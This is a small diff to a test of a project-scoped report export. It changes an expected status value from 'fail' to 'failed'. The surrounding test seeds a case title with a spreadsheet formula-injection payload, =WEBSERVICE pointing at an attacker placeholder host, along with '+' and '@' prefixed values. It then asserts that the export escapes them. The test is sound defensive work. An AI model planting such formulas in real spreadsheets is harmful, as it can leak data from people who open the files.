@@ -33,7 +33,7 @@ def test_j10_report_crud_export_and_foreign_access_are_project_scoped(
         db_session,
         project_id=1,
         suffix="REPORT",
-        execution_status="fail",
+        execution_status="failed",
     )
     own_case.title = "=WEBSERVICE(\"https://attacker.invalid\")"
     own_case.domain = "+malicious-domain"
@@ -92,7 +92,7 @@ def test_j10_report_crud_export_and_foreign_access_are_project_scoped(
     assert workbook["用例明细"]["B2"].value.startswith("'=WEBSERVICE")
     assert workbook["用例明细"]["C2"].value == "'+malicious-domain"
     assert workbook["用例明细"]["D2"].value == "'@malicious-module"
-    assert workbook["用例明细"]["G2"].value == "fail"
+    assert workbook["用例明细"]["G2"].value == "failed"
     assert workbook["用例明细"]["H2"].value == "Admin"
 
     rejected = client.post(
